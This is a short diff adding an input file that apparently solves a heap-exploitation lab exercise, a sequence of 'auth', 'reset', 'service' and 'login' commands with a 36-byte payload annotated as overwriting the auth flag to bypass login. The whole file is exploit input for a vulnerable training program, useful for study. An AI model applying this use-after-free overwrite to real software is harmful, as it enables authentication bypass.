@@ -1,0 +1,7 @@
+auth test
+
+reset
+
+service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB #python -c 'print "A" * 32 + "B" * 4, overwrites auth->auth to non-zero
+
+login
